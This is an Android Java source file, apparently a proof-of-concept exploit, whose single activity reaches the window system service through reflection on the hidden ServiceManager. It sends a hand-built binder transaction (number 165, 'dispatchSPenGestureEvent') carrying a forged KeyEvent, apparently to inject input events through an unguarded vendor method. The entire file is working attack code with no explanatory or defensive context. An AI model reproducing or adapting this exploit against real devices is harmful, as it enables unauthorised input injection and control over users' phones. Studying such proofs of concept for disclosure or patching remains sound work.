package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.view.InputEvent;
import android.view.KeyEvent;

public class MainActivity extends Activity {
    static final int TRANSACTION_dispatchSPenGestureEvent = 165;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("window");

            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
            parcel.writeInt(100);
            parcel.writeInt(100);
            parcel.writeTypedArray(new InputEvent[]{new KeyEvent(1, 23)}, 0);
            parcel.writeStrongBinder(null);

            Parcel reply = Parcel.obtain();
            binder.transact(TRANSACTION_dispatchSPenGestureEvent, parcel, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}